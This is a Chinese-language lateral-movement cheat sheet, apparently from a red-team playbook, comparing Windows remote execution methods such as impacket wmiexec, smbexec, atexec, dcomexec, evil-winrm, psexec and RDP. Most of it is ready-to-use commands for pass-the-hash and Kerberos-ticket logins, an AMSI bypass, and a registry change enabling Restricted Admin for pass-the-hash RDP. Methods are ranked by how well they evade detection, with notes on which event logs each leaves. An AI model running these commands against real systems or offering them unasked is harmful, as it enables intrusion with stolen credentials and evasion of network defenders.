# 远程执行方法对比详解

Windows 环境中存在多种远程命令执行方式，每种在检测风险、速度、前提条件和 OPSEC 方面各有差异。

---

## 综合对比表

| 方法 | 协议 | 端口 | 检测风险 | 文件落地 | 交互性 | 前提条件 |
|------|------|------|----------|----------|--------|----------|
| wmiexec | WMI + SMB | 135 + 动态 + 445 | **低** | 无 | 半交互 | WMI 服务、Admin Share |
| smbexec | SMB | 445 | 中 | 无 | 半交互 | Admin Share ($C) |
| atexec | SMB | 445 | 中 | 无 | 单命令 | Task Scheduler 服务 |
| dcomexec | DCOM + SMB | 135 + 动态 + 445 | 中 | 无 | 半交互 | DCOM 组件可用 |
| evil-winrm | WinRM | 5985/5986 | 中 | 无 | 完全交互 | WinRM 服务启用 |
| psexec | SMB | 445 | **高** | 有 (exe) | 完全交互 | Admin Share、可写 |

**推荐优先级**: wmiexec > smbexec > atexec > dcomexec > evil-winrm > psexec

---

## wmiexec (推荐首选)

通过 WMI 创建进程，输出写入临时文件再经 SMB 读取。

```bash
# 使用密码
impacket-wmiexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'

# 使用 Hash
impacket-wmiexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'

# 使用 Kerberos 票据
export KRB5CCNAME=<USER>.ccache
impacket-wmiexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_FQDN>'

# 执行单条命令
impacket-wmiexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>' 'whoami'

# NetExec 方式 (默认使用 wmiexec)
netexec smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami'
```

### OPSEC 考虑

- 不上传任何文件
- 不创建服务
- WMI 事件在默认日志配置下不明显
- 输出临时文件 (`ADMIN$` 下) 执行后自动删除

---

## smbexec

每条命令创建一个临时服务执行，不上传文件。

```bash
# 使用密码
impacket-smbexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'

# 使用 Hash
impacket-smbexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'

# Server 模式 (结果回传到攻击机 SMB)
impacket-smbexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>' -mode SERVER

# NetExec 指定执行方式
netexec smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
```

### OPSEC 考虑

- 每条命令创建+删除一个服务 (产生 Event 7045)
- 无文件上传
- 比 psexec 隐蔽，但服务创建日志仍可被 SIEM 捕获

---

## atexec

利用 Windows 任务计划程序 (Task Scheduler) 执行单条命令。

```bash
# 使用密码
impacket-atexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' 'whoami'

# 使用 Hash
impacket-atexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>' 'ipconfig /all'

# 执行 PowerShell
impacket-atexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>' \
  'powershell -enc <BASE64_COMMAND>'
```

### OPSEC 考虑

- 创建计划任务后立即执行并删除
- 产生 Event 4698 (任务创建) + 4699 (任务删除)
- 仅支持单命令执行，无交互式 Shell
- 适合只需执行一两条命令的场景

---

## dcomexec

通过 DCOM (Distributed Component Object Model) 执行命令。

```bash
# 使用 Hash
impacket-dcomexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'

# 指定 DCOM 对象
impacket-dcomexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>' -object MMC20

# 使用密码
impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

### OPSEC 考虑

- 不创建服务，不上传文件
- 走 DCOM 协议，与 WMI 类似但路径不同
- 某些 DCOM 对象可能在特定系统版本上不可用
- 当 WMI 被阻止时的替代选择

---

## evil-winrm

通过 WinRM (Windows Remote Management) 获得完整 PowerShell 交互。

```bash
# 使用密码
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>'

# 使用 Hash
evil-winrm -i <TARGET> -u '<USER>' -H '<NT_HASH>'

# 使用 Kerberos 票据
export KRB5CCNAME=<USER>.ccache
evil-winrm -i <TARGET_HOSTNAME> -r <REALM>
```

### 内置功能

```powershell
# 上传文件
upload /local/path /remote/path

# 下载文件
download /remote/path /local/path

# 绕过 AMSI
Bypass-4MSI

# 加载 PowerShell 脚本
menu
```

### OPSEC 考虑

- 需要目标启用 WinRM 服务 (端口 5985/5986)
- 产生 PowerShell 日志 (Script Block Logging, Transcription)
- 提供完整 PowerShell 环境，功能最丰富
- 用户需在 Remote Management Users 组或 Administrators 组

---

## psexec (检测风险最高)

上传可执行文件到 `ADMIN$`，创建服务执行。

```bash
# 使用密码
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'

# 使用 Hash
impacket-psexec -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'

# 使用 Kerberos 票据
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_FQDN>'
```

### OPSEC 考虑

- **上传可执行文件到 ADMIN$ 共享** (磁盘落地)
- 创建服务 (Event 7045)
- Defender/EDR 通常会检测并阻止
- 完全交互式 Shell (SYSTEM 权限)
- 仅在其他方法不可用时使用

---

## RDP (远程桌面)

需要图形界面时使用。

```bash
# 使用密码
xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET> /cert-ignore

# PTH (需要 Restricted Admin 模式)
xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NT_HASH> /v:<TARGET>
```

### 启用 Restricted Admin

```bash
# 检查
impacket-reg '<DOMAIN>/<USER>@<TARGET>' -hashes ':<NT_HASH>' query \
  -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'

# 启用 (设为 0)
impacket-reg '<DOMAIN>/<USER>@<TARGET>' -hashes ':<NT_HASH>' add \
  -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' \
  -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```

---

## 端口需求速查

| 方法 | 必需端口 |
|------|----------|
| psexec / smbexec / atexec | TCP 445 |
| wmiexec | TCP 135 + 动态端口 + TCP 445 |
| dcomexec | TCP 135 + 动态端口 + TCP 445 |
| evil-winrm | TCP 5985 (HTTP) 或 5986 (HTTPS) |
| RDP | TCP 3389 |

---

## 故障排除

| 错误 | 原因 | 解决方案 |
|------|------|----------|
| STATUS_ACCESS_DENIED | 用户非目标管理员 | 确认 `(Pwn3d!)` 状态 |
| Connection refused | 服务未运行/防火墙 | 换用其他方法或检查端口 |
| STATUS_LOGON_FAILURE | 凭据错误或账户锁定 | 验证 Hash/密码正确性 |
| Timeout | 网络不通或目标离线 | 检查路由和目标状态 |
| KRB_AP_ERR_SKEW | 时间偏差 > 5 分钟 | `ntpdate <DC_IP>` 同步时间 |
